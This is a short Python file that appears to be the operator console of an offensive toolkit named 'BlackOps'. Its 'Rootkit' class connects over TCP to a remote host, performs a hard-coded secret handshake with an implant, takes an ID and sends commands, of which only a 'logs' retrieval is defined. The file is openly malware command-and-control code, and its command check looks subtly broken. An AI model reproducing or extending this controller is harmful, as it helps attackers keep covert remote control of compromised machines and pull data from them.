import socket
import sys


class Rootkit:
    def __init__(self, addr: str, port: int):
        self.help_info = ("rootkit", "displays information on rootkit, and access to rootkit commands", None, [])
        self.addr = addr
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.id = str()
        self.log = str()
        self.commands = (
            ("logs", "retrieves and prints the logs", [])
        )
        self.prompt = "BlackOps::rootkit::#>"

    def __exit__(self):
        self.sock.close()

    def _init_connection_(self):
        self.sock.connect((self.addr, self.port))
        print("         connected to the server")
        data = self.sock.recv(4096)
        if data == b"ablfasksbdedoefjnthvymgb":
            self.sock.sendall(b"nbhvcrngmhbncjvkybyvbjn")
            data = self.sock.recv(4096)
            self.id = data.decode(errors="replace")
            self.prompt = f"BlackOps::rootkit::{self.id}::#>"
        else:
            print("authentication failed on server side")
            self.sock.close()

    def send(self, command):
        if command not in self.commands:
            return -1
        self.sock.sendall(command.encode())
        data = self.sock.recv(4096)
        return data
